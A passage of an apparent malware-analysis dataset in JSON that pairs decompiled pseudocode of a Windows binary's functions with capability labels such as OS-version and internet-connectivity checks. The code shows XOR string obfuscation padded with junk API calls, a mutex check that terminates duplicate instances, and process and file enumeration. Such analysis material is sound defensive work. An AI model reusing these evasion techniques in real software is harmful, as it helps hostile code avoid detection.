0x10) != 0)) {\n                            var_38h = 0x7223772b;\n                            var_34h._0_2_ = 0x5331;\n                            var_34h._2_1_ = 6;\n                            var_34h._3_1_ = 0x77;\n                            var_30h = 0x7220;\n                            var_2eh = 0x72;\n                            var_2dh = 0x29773453;\n                            var_29h = 0x13532672;\n                            var_25h = 0x3c722577;\n                            var_21h = 0x3f770053;\n                            var_1dh = 0x33530e72;\n                            var_19h = 0x3f722977;\n                            var_15h = 0x4c771753;\n                            var_11h = 0x72;\n                            var_74h = 0x724c7767;\n                            var_70h._0_2_ = 0x5352;\n                            fcn.004121e7(6, puVar18, extraout_ECX);\n                            var_4h = 0;\n                            iVar12 = &var_38h - var_c4h;\n                            do {\n                                iVar11 = var_4h;\n                                pcVar1 = var_c4h + var_4h;\n                                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                uVar2 = *(&var_74h + iVar11 % 6);\n                                uVar3 = pcVar1[iVar12];\n                                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                var_4h = var_4h + 1;\n                                *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                            } while (var_4h < 0x28);\n                            var_b4h = 0x61257629;\n                            var_b0h._0_2_ = 0x4a08;\n                            var_b0h._2_1_ = 0x2c;\n                            stack0xffffff4f = 0xc613476;\n                            var_a9h = 0x976094a;\n                            var_a5h = 0x74a3461;\n                            var_a1h = 0x19613676;\n                            var_9dh = 0x976044a;\n                            var_99h._0_1_ = 0x61;\n                            stack0xffffff65 = 0x38760d4a;\n                            var_93h = 0x684a0861;\n                            var_8fh._0_1_ = 0x76;\n                            var_7ch = 0x61557668;\n                            var_78h._0_2_ = 0x4a78;\n                            var_99h._1_1_ = var_b0h._2_1_;\n                            fcn.0041224e(extraout_ECX_00);\n                            var_4h = 0;\n                            iVar12 = &var_b4h - var_cch;\n                            do {\n                                iVar11 = var_4h;\n                                pcVar1 = var_cch + var_4h;\n                                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                uVar2 = *(&var_7ch + iVar11 % 6);\n                                uVar3 = pcVar1[iVar12];\n                                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                var_4h = var_4h + 1;\n                                *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                            } while (var_4h < 0x26);\n                            var_5ch = var_cch;\n                            var_58h = var_c4h;\n                            var_48h = 0;\n                            stack0xffffff70 = 0x75623959;\n                            var_88h._0_2_ = 0x484e;\n                            do {\n                                var_40h = 0x7511397c;\n                                var_3ch = 0x397c4812;\n                                var_38h = 0x48127511;\n                                var_34h._0_2_ = 0x397c;\n                                var_34h._2_1_ = 0x11;\n                                var_34h._3_1_ = 0x75;\n                                var_30h = 0x4812;\n                                var_2eh = 0x2c;\n                                var_2dh = 0x24751339;\n                                var_29h = 0x9393a48;\n                                var_25h = 0x3e482b75;\n                                var_21h = 0x26751739;\n                                var_1dh = 0x4c393548;\n                                var_19h = 0x34483a75;\n                                var_15h = 0x4e751239;\n                                var_11h = 0x48;\n                                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n                                iVar12 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n                                uVar13 = 0;\n                                do {\n                                    *(iVar12 + uVar13) = *(iVar12 + uVar13) + 'N';\n                                    uVar13 = uVar13 + 1;\n                                } while (uVar13 < 0x61);\n                                sub.ntdll.dll_memset(iVar12, 0, 0x61);\n                                var_4h = 0;\n                                var_d8h = &var_40h - iVar12;\n                                do {\n                                    iVar11 = var_4h;\n                                    pcVar1 = iVar12 + var_4h;\n                                    cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                    uVar2 = *(&var_8fh + iVar11 % 6 + 3);\n                                    uVar3 = pcVar1[var_d8h];\n                                    cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                    uVar13 = var_48h;\n                                    puVar10 = ARG_0;\n                                    var_4h = var_4h + 1;\n                                    *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                                } while (var_4h < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar12, var_c0h, &lpString1, (&var_5ch)[var_48h]);\n                                iVar11 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar10);\n                                if (iVar11 != -1) {\n                                    fcn.0040a12c();\n                                    var_bch = 1;\n                                }\n                                uVar17 = 0;\n                                do {\n                                    *(iVar12 + uVar17) = *(iVar12 + uVar17) * var_d4h;\n                                    uVar17 = uVar17 + 1;\n                                } while (uVar17 < 0x61);\n                                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar12);\n                                (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n                                var_48h = uVar13 + 1;\n                            } while (var_48h < 2);\n                            fcn.00412229();\n                            fcn.004121c2();\n                            puVar14 = var_64h;\n                            puVar16 = lpString2;\n                        }\n                        uVar13 = 0;\n                        do {\n                            *(puVar14 + uVar13) = *(puVar14 + uVar13) + -0x7d;\n                            uVar13 = uVar13 + 1;\n                        } while (uVar13 < 0xd);\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar14);\n                        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n                        uVar13 = 0;\n                        do {\n                            *(puVar16 + uVar13) = *(puVar16 + uVar13) + -10;\n                            uVar13 = uVar13 + 1;\n                        } while (uVar13 < 9);\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar16);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                        iVar12 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar12 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                fcn.0040a1b7();\n                piVar9 = var_c0h;\n                puVar10 = ARG_0;\n            }\n        }\n        if (var_50h != NULL) {\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_50h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        }\n        if (piVar9 != NULL) {\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        }\n        if (puVar10 != NULL) {\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar10);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        }\n    }\n    return var_bch;\n}\n",
        "token_count": 4661
    },
    "004135a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004135a8(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.0040d8ef();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 277
    },
    "004136ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004136ac(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    code *pcVar11;\n    uint var_280h;\n    uint s;\n    int32_t var_278h;\n    uint var_268h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uchar *pszPath;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x4279d8 != 0) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n        var_280h = 0;\n        var_40h = iVar6;\n        sub.ntdll.dll_memset(&s, 0, 0x228);\n        var_50h = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar7 = (*pcVar11)(8, 0x208);\n        puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n        var_48h = 0;\n        pszPath = puVar8;\n        if ((puVar8 != NULL) && (iVar6 != -1)) {\n            iVar9 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar6, &var_280h);\n            if (iVar9 != 0) {\n                do {\n                    if (var_50h == var_278h) {\n                        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                            *puVar8 = 0;\n                            puVar8 = puVar8 + 1;\n                        }\n                        fcn.00402281();\n                        var_24h = 0x65027234;\n                        var_20h = 0x72316a02;\n                        var_1ch = 0x6a13650e;\n                        var_18h = 0x65147222;\n                        var_14h = 0x72226a5e;\n                        var_10h = 0x6a15651f;\n                        var_ch = CONCAT22(var_ch._2_2_, 0x7247);\n                        var_8h = 0x65677247;\n                        var_4h._0_2_ = 0x6a70;\n                        uVar7 = (*pcVar11)(8, 0x35);\n                        iVar6 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar7);\n                        uVar10 = 0;\n                        do {\n                            *(iVar6 + uVar10) = *(iVar6 + uVar10) * -9;\n                            uVar10 = uVar10 + 1;\n                        } while (uVar10 < 0x35);\n                        sub.ntdll.dll_memset(iVar6, 0, 0x35);\n                        var_3ch = 0;\n                        var_4ch = &var_24h - iVar6;\n                        do {\n                            iVar9 = var_3ch;\n                            pcVar1 = iVar6 + var_3ch;\n                            cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            uVar2 = *(&var_8h + iVar9 % 6);\n                            uVar3 = pcVar1[var_4ch];\n                            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            var_3ch = var_3ch + 1;\n                            *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                        } while (var_3ch < 0x1a);\n                        uVar7 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(pszPath, iVar6);\n                        iVar9 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(uVar7);\n                        if (iVar9 == 0) {\n                            var_48h = 1;\n                        }\n                        uVar10 = 0;\n                        do {\n                            *(iVar6 + uVar10) = *(iVar6 + uVar10) ^ 6;\n                            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            uVar10 = uVar10 + 1;\n                        } while (uVar10 < 0x35);\n                        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar7);\n                        iVar6 = var_40h;\n                        puVar8 = pszPath;\n                    }\n                    iVar9 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar6, &var_280h);\n                } while (iVar9 != 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar6);\n            }\n            uVar7 = (*pcVar11)(0, puVar8);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n            if (var_48h != 0) {\n                return;\n            }\n        }\n    }\n    var_38h = 0x3829782a;\n    var_34h = 0x780f6118;\n    var_30h = 0x61093825;\n    var_2ch = 0x3809781c;\n    var_28h = 0x780d6104;\n    var_24h = 0x6113383e;\n    var_20h = 0x38237829;\n    var_1ch = 0x78176103;\n    var_18h = 0x613e3838;\n    var_14h = 0x383e7811;\n    var_10h = 0x7818610f;\n    var_ch = 0x616a3828;\n    var_8h = 0x384c7879;\n    var_4h._0_2_ = 0x616a;\n    uVar7 = (*pcVar11)(8, 0x61);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    uVar10 = 0;\n    do {\n        *(iVar6 + uVar10) = *(iVar6 + uVar10) + '/';\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x61);\n    sub.ntdll.dll_memset(iVar6, 0, 0x61);\n    var_3ch = 0;\n    var_40h = &var_38h - iVar6;\n    do {\n        iVar9 = var_3ch;\n        pcVar1 = iVar6 + var_3ch;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_40h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_3ch = var_3ch + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (var_3ch < 0x30);\n    iVar9 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar6);\n    if (iVar9 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar6);\n    }\n    else {\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar7);\n    }\n    uVar10 = 0;\n    do {\n        *(iVar6 + uVar10) = *(iVar6 + uVar10) ^ 0x67;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x61);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    return;\n}\n",
        "token_count": 1963
    },
    "00413cf8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00413cf8(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uchar *puVar6;\n    code *pcVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint uVar10;\n    uint uVar11;\n    int32_t iVar12;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    code *pcVar13;\n    code *pcVar14;\n    code *pcStack364;\n    code *pcStack360;\n    uint uStack356;\n    uint uStack352;\n    int32_t iStack348;\n    uint uStack344;\n    uchar *puStack340;\n    uint uStack336;\n    uchar *puStack332;\n    unkbyte3 Stack327;\n    uchar *puStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uchar *puStack316;\n    int32_t iStack312;\n    uint *puStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    int32_t iStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uchar uStack268;\n    uchar uStack267;\n    ushort uStack266;\n    uint uStack264;\n    uint32_t uStack260;\n    uchar uStack256;\n    uchar uStack255;\n    ushort uStack254;\n    uint uStack252;\n    uint8_t auStack248 [4];\n    char *pcStack244;\n    uchar auStack240 [2];\n    ushort uStack238;\n    uchar uStack236;\n    uchar uStack235;\n    uchar uStack234;\n    uchar uStack233;\n    char *pcStack232;\n    char *pcStack228;\n    uchar uStack224;\n    uchar uStack223;\n    ushort uStack222;\n    char *pcStack220;\n    int32_t iStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint uStack204;\n    code *pcStack200;\n    int32_t iStack196;\n    uchar auStack136 [44];\n    int32_t iStack92;\n    uchar *puStack56;\n    uchar *puStack24;\n    uint uStack16;\n    \n    pcVar13 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    iStack196 = 0x208;\n    pcStack200 = 0x8;\n    uStack16 = 0;\n    uStack204 = 0x413d1f;\n    uStack204 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puStack208 = 0x413d28;\n    puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    puStack208 = 0x208;\n    uStack212 = 8;\n    iStack216 = 0x413d3a;\n    puStack24 = puVar6;\n    iStack216 = (*pcVar13)();\n    pcStack220 = 0x413d3d;\n    puStack56 = (*pcVar7)();\n    for (iVar12 = 0x208; pcVar7 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA,  iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    pcStack220 = \"true\";\n    puVar6 = puStack56;\n    for (iVar12 = 0x208; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uStack224 = 200;\n    uStack223 = 0x5c;\n    uStack222 = 0x41;\n    pcStack228 = 0x413d69;\n    (*pcVar7)();\n    pcStack228 = \"navigator\";\n    pcStack232 = \"crackmeololo\";\n    uStack236 = 0x76;\n    uStack235 = 0x3d;\n    uStack234 = 0x41;\n    uStack233 = 0;\n    (*pcVar7)();\n    uStack236 = 0xd4;\n    uStack235 = 0x5c;\n    uStack234 = 0x41;\n    uStack233 = 0;\n    auStack240[0] = 0xf0;\n    auStack240[1] = 0x5c;\n    uStack238 = 0x41;\n    pcStack244 = 0x413d7e;\n    (*pcVar7)();\n    pcStack244 = \"SetErrorMode\";\n    auStack248[0] = 0xf4;\n    auStack248[1] = 0x56;\n    auStack248[2] = 0x41;\n    auStack248[3] = 0;\n    uStack252 = 0x413d8e;\n    uStack252 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack256 = 0x95;\n    uStack255 = 0x3d;\n    uStack254 = 0x41;\n    pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack256 = 0;\n    uStack255 = 0;\n    uStack254 = 0;\n    uStack260 = 0x413d9c;\n    uStack260 = (*pcVar7)();\n    uStack260 = uStack260 | 2;\n    uStack264 = 0x413da2;\n    (*pcVar7)();\n    uStack236 = 0x62;\n    uStack235 = 0x4b;\n    uStack234 = 0x58;\n    uStack233 = 0x39;\n    pcStack232 = 0x4b213514;\n    pcStack228 = 0x35503919;\n    uStack224 = 0x27;\n    uStack223 = 0x4b;\n    uStack222 = 0x391b;\n    pcStack220 = 0x4b42354d;\n    pcStack244 = 0x39754b42;\n    auStack240[0] = 0x39;\n    auStack240[1] = 0x35;\n    uStack268 = 0xe6;\n    uStack267 = 0x3d;\n    uStack266 = 0x41;\n    fcn.0040cda9();\n    pcVar7 = _sym.imp.KERNEL32.dll_GetLastError;\n    puStack208 = &stack0xffffff10 + -iStack92;\n    iStack196 = 0;\n    do {\n        iVar12 = iStack196;\n        pcVar1 = iStack92 + iStack196;\n        uStack268 = 6;\n        uStack267 = 0x3e;\n        uStack266 = 0x41;\n        cVar4 = (*pcVar7)();\n        uStack268 = 6;\n        uStack267 = 0;\n        uStack266 = 0;\n        uVar2 = (&stack0xffffff08)[iVar12 % 6];\n        uVar3 = pcVar1[puStack208];\n        uStack268 = 0x1f;\n        uStack267 = 0x3e;\n        uStack266 = 0x41;\n        cVar5 = (*pcVar7)();\n        iStack196 = iStack196 + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n        pcVar13 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    } while (iStack196 < 0x14);\n    uStack268 = 0x29;\n    uStack267 = 0;\n    uStack266 = 0;\n    uStack272 = 8;\n    auStack240[0] = 0x5a;\n    auStack240[1] = 0x30;\n    uStack238 = 0x3464;\n    uStack236 = 0x4c;\n    uStack235 = 0x7a;\n    uStack234 = 0x43;\n    uStack233 = 0x49;\n    pcStack232 = 0x30086151;\n    pcStack228 = 0x7a04343f;\n    uStack224 = 0x42;\n    uStack223 = 0x49;\n    uStack222 = 0x6134;\n    iStack216 = 0x3449307a;\n    uStack212 = CONCAT31(uStack212._1_3_, 0x61);\n    uStack276 = 0x413e79;\n    uStack276 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack280 = 0x413e80;\n    iVar12 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n    uVar8 = 0;\n    do {\n        *(iVar12 + uVar8) = *(iVar12 + uVar8) + '\\x15';\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x29);\n    uStack280 = 0x29;\n    uStack284 = 0;\n    uStack292 = 0x413e9d;\n    iStack288 = iVar12;\n    puStack208 = iVar12;\n    sub.ntdll.dll_memset();\n    iStack216 = 0;\n    pcStack220 = &stack0xffffff04 + -iVar12;\n    do {\n        pcVar1 = iVar12 + iStack216;\n        uStack280 = 0x413eb9;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uStack280 = 5;\n        uVar2 = (&stack0xffffff1c)[iStack216 % 5];\n        uVar3 = pcVar1[pcStack220];\n        uStack280 = 0x413ed8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n        iStack216 = iStack216 + 1;\n        iVar12 = puStack208;\n    } while (iStack216 < 0x14);\n    uStack280 = 0x14;\n    uStack284 = 8;\n    uStack252 = 0x235e2631;\n    auStack248[0] = 0x32;\n    auStack248[1] = 0xb;\n    auStack248[2] = 0x16;\n    auStack248[3] = 5;\n    pcStack244 = 0x3136205a;\n    auStack240[0] = 0x1d;\n    auStack240[1] = 8;\n    uStack238 = 0x2941;\n    uStack236 = 0x25;\n    uStack235 = 0x32;\n    uStack234 = 0x72;\n    uStack260 = 0x4e334972;\n    uStack256 = 0x53;\n    uStack255 = 0x65;\n    iStack288 = 0x413f3a;\n    iStack288 = (*pcVar13)();\n    uStack292 = 0x413f41;\n    pcStack228 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    pcStack244 = NULL;\n    *pcStack228 = 0;\n    *(pcStack228 + 4) = 0;\n    *(pcStack228 + 8) = 0;\n    *(pcStack228 + 0xc) = 0;\n    *(pcStack228 + 0x10) = 0;\n    pcVar7 = _sym.imp.KERNEL32.dll_GetLastError;\n    pcStack232 = &stack0xfffffef8 + -pcStack228;\n    do {\n        iVar12 = pcStack244;\n        pcVar1 = pcStack244 + pcStack228;\n        uStack292 = 0x413f6b;\n        cVar4 = (*pcVar7)();\n        uStack292 = 6;\n        uVar2 = (&stack0xfffffef0)[iVar12 % 6];\n        uVar3 = pcVar1[pcStack232];\n        uStack292 = 0x413f84;\n        cVar5 = (*pcVar7)();\n        pcStack244 = pcStack244 + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (pcStack244 < 0x13);\n    uStack292 = 0xd;\n    uStack296 = 8;\n    uStack264 = 0x34211d39;\n    iVar12 = 0;\n    uStack260 = 0x7b587e24;\n    uStack256 = 0;\n    uStack255 = 0x14;\n    uStack254 = 0x4d04;\n    uStack272 = 0x7864556a;\n    uStack268 = 0x68;\n    uStack267 = 0x4d;\n    uStack300 = 0x413fcd;\n    uStack300 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack304 = 0x413fd4;\n    puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n    uStack256 = 0;\n    uStack255 = 0;\n    uStack254 = 0;\n    *puVar9 = 0;\n    puVar9[1] = 0;\n    puVar9[2] = 0;\n    *(puVar9 + 3) = 0;\n    puVar6 = &stack0xfffffeec + -puVar9;\n    uStack236 = SUB41(puVar6, 0);\n    uStack235 = puVar6 >> 8;\n    uStack234 = puVar6 >> 0x10;\n    uStack233 = puVar6 >> 0x18;\n    pcStack244 = puVar9;\n    do {\n        pcVar1 = iVar12 + puVar9;\n        uStack304 = 0x413ff9;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uStack304 = 6;\n        uVar2 = (&stack0xfffffee4)[iVar12 % 6];\n        uVar3 = pcVar1[CONCAT13(uStack233, CONCAT12(uStack234, CONCAT11(uStack235, uStack236)))];\n        uStack304 = 0x414016;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar12 = CONCAT22(uStack254, CONCAT11(uStack255, uStack256)) + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n        uStack256 = iVar12;\n        uStack255 = iVar12 >> 8;\n        uStack254 = iVar12 >> 0x10;\n    } while (iVar12 < 0xc);\n    uStack304._0_2_ = CONCAT11(auStack240[1], auStack240[0]);\n    uStack304._2_2_ = uStack238;\n    iStack312 = 0x414033;\n    puStack308 = puVar9;\n    iStack312 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    puStack316 = 0x41403a;\n    pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    puStack316 = 0x414042;\n    puStack320 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    puStack316 = &stack0xffffff78;\n    uStack324 = 0x414054;\n    (*pcVar7)();\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uStack324 = 0x208;\n    puStack328 = 0x8;\n    puStack332 = 0x414063;\n    puStack332 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack336 = 0x41406a;\n    puStack340 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack336 = 0x104;\n    uStack268 = SUB41(puStack340, 0);\n    uStack267 = puStack340 >> 8;\n    uStack266 = puStack340 >> 0x10;\n    puVar6 = puStack340;\n    for (iVar12 = 0x208; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uStack344 = 0;\n    iStack348 = 0x414089;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)();\n    *0x4279dc = uStack280;\n    iStack348 = 0x414097;\n    *0x4279d8 = fcn.004101fe();\n    iStack348 = 0x4140aa;\n    iVar12 = fcn.004139dd();\n    if (iVar12 == 0) {\n        iStack348 = 0x414104;\n        iVar12 = fcn.00413acb();\n        pcVar13 = pcVar7;\n        if (iVar12 != 0) {\n            iStack348 = 0x13;\n            uStack352 = 8;\n            puStack320 = 0x60363167;\n            puStack316 = 0x277f307a;\n            iStack312 = 0x2071602c;\n            puStack308 = 0x77212b67;\n            uStack304._0_2_ = 0x7170;\n            puStack328 = 0x32736232;\n            uStack324 = CONCAT22(uStack324._2_2_, 0x7134);\n            uStack356 = 0x414148;\n            uStack356 = (*pcVar7)();\n            pcStack360 = 0x41414f;\n            puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iStack312 = 0;\n            *puVar9 = 0;\n            puVar9[1] = 0;\n            puVar9[2] = 0;\n            puVar9[3] = 0;\n            *(puVar9 + 4) = 0;\n            *(puVar9 + 0x12) = 0;\n            pcVar7 = _sym.imp.KERNEL32.dll_GetLastError;\n            puStack308 = &stack0xfffffeb4 + -puVar9;\n            do {\n                iVar12 = iStack312;\n                pcVar1 = iStack312 + puVar9;\n                pcStack360 = 0x41417e;\n                cVar4 = (*pcVar7)();\n                pcStack360 = 0x6;\n                uVar2 = (&stack0xfffffeac)[iVar12 % 6];\n                uVar3 = pcVar1[puStack308];\n                pcStack360 = 0x414197;\n                cVar5 = (*pcVar7)();\n                iStack312 = iStack312 + 1;\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n            } while (iStack312 < 0x12);\n            pcStack360 = 0x6;\n            pcStack364 = 0x8;\n            puStack332 = 0x1121461;\n            puStack328 = CONCAT31(Stack327, 0x46);\n            puStack340 = 0x44474635;\n            uStack336 = CONCAT31(uStack336._1_3_, 0x46);\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n            uStack324 = 0;\n            *puVar9 = 0;\n            *(puVar9 + 1) = 0;\n            puStack320 = &stack0xfffffea8 + -puVar9;\n            do {\n                iVar12 = uStack324;\n                pcVar1 = uStack324 + puVar9;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = (&stack0xfffffea0)[iVar12 % 5];\n                uVar3 = pcVar1[puStack320];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar10 = uStack204;\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                uStack324 = uStack324 + 1;\n            } while (uStack324 < 5);\n            (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(uStack204, puVar9);\n            pcVar13 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n            uVar10 = (*pcVar13)(0, uVar10);\n            (*pcVar7)(uVar10);\n        }\n        iStack348 = 0x41426c;\n        iVar12 = fcn.00413b80();\n        if (iVar12 == 0) goto code_r0x0041427b;\n        